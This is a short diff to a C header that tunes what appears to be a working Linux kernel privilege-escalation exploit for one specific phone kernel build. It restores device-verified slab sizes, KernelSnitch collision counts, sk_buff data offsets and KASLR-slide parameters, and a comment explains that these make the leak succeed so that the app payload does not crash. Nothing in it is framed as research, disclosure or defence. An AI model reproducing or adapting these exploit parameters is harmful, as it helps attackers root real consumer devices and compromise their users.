@@ -17,7 +17,26 @@
 #define P0_PAGE_OFFSET 0xffffff8000000000ULL
 #define P0_PHYS_OFFSET 0x80000000ULL
 #define P0_KERNEL_PHYS_LOAD 0x80000000ULL
-#define SKB_DATA_DELTA (-0xe80LL)
+
+/* Restore the a8268ca device-verified geometry that the bebcae7
+ * refactor dropped back to the common.h defaults:
+ *  - MM_STRUCT_SZ 0x400: DZG1 mm_struct slab object is 1024 bytes
+ *    (measured from /proc/slabinfo, confirmed by BTF sizeof=0x3c0
+ *    rounded up to the kmalloc-cg-1k object); the 0x500 default makes
+ *    KernelSnitch miss every mm_struct object index and fail the
+ *    sk_buff page leak, which then panics the app payload.
+ *  - KSNITCH_COLLISIONS 5 matches the device-tested e1s/e2s targets.
+ *  - SKB_DATA_DELTA -0x1000 and SLIDE_PSELECT_WORD_SHIFT 3 are the
+ *    values this kernel inherits from the identical 6.1.145 E3Q DZF2
+ *    build (same 33419968 kernel source commit).
+ */
+#define SKB_DATA_DELTA (-0x1000LL)
+#ifndef MM_STRUCT_SZ
+#define MM_STRUCT_SZ 0x400
+#endif
+#ifndef KSNITCH_COLLISIONS
+#define KSNITCH_COLLISIONS 5
+#endif
 
 #define SLIDE_FAKE_WAITER_PRIO 0
 #define SLIDE_WAITER_WAKE_STATE 0
@@ -25,7 +44,7 @@
 #define SLIDE_USE_FAKE_TASK 1
 #define SLIDE_TRACEFS_EVENT_ID 106
 #define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x000db1a0ULL
-#define SLIDE_PSELECT_WORD_SHIFT 0
+#define SLIDE_PSELECT_WORD_SHIFT 3
 #define SLIDE_P0_OFFSET_CANDIDATES \
   0x000000ULL, 0x010000ULL, 0x020000ULL, 0x030000ULL, \
   0x040000ULL, 0x050000ULL, 0x060000ULL, 0x070000ULL, \
